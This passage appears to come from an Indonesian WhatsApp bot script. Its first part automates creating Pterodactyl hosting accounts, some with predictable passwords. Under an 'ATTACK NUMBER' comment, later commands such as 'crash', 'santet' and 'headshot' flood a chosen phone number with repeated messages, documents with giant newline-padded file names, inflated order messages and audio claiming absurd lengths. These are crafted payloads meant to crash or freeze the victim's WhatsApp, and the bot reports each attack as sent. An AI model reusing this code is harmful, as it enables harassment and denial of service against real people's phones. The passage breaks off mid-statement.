let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "120"
let disk = "0"
let email = username + "@Oktz.com"
akunlo = "https://telegra.ph/file/fed0dfec749f90cb6c61a.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domainn + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domainn + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

╔┈┈┈「INFO PANEL」┈┈┈
╎ *👤USERNAME* : ${user.username}
 ╎*🔐PASSWORD* : ${password}
╎ *🌐LOGIN* : ${domain}
 ╎*😎PEMILIK SERVER* : *${namaCreator}*
╚┈┈┈┈┈┈┈┈┈┈┈┈
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*GRUP OWNER :*
https://chat.whatsapp.com/J38glFSg1BDAvh17Adc76k

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainn + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus De4you Offcial Aja`)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "@de4you.com"
akunlo = "https://telegra.ph/file/9bc01d7f3dfa23f2036b2.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = generateRandomPassword();
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@Zamzz127

*GRUP OWNER :*
https://chat.whatsapp.com/DnqpNlCW6fCBhkMERej87f

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
// ATTACK NUMBER
case "gas": case "kill": case "crash":{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { text: "DE4YOUJEMBOT-17 Bug🔥`" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { text: "DE4YOUJEMBOT-17 Bug🔥`" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "shoot": case "bugkuy":  case "duarr":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { document: thumb, caption: "DE4YOUJEMBOT-17 Bug🔥`", fileName: `DE4YOUJEMBOT-17 Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
Biiofc.sendMessage(prrkek, { document: thumb, caption: "YOUTUBE DE4YOU OFFCIAL`", fileName: `DE4YOUJEMBOT-17 Bug🔥 ⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${button}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, mimetype: "text/basesid" }, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "killyou": case "doblekill": case "triplekill":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "DE4YOUJEMBOT-17 Bug🔥", author: "" })
Biiofc.sendStimg(prrkek, ppuser, lep, { packname: "DE4YOUJEMBOT-17 Bug🔥", author: "" })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
case "savage": case "santet": case "danger":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
const order = generateWAMessageFromContent(prrkek, proto.Message.fromObject({
"orderMessage": {
"orderId": "391028153034238",
"thumbnail": fkethmb,
"itemCount": 9999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "Youtube de4youjembot-17`",
"message": `${button}`,
"sellerJid": "6283183432282@s.whatsapp.net",
"token": "AR7zJt8MasFx2Uir/fdxhkhPGDbswfWrAr2gmoyqNZ/0Wg==",
"totalAmount1000": "99999",
"totalCurrencyCode": "IDR",
}
}), { userJid: prrkek, quoted: lep })
Biiofc.relayMessage(prrkek, order.message, { messageId: order.key.id})
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
"sourceUrl": "https://youtu.be/ZlabLFVCFms" }}}, { quoted: m })
}
break
case "meninggal": case "headshot": case "mati":{
if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
Biiofc.sendMessage(prrkek, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: false}, { quoted: lep })
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtu.be/ZlabLFVCFms", 
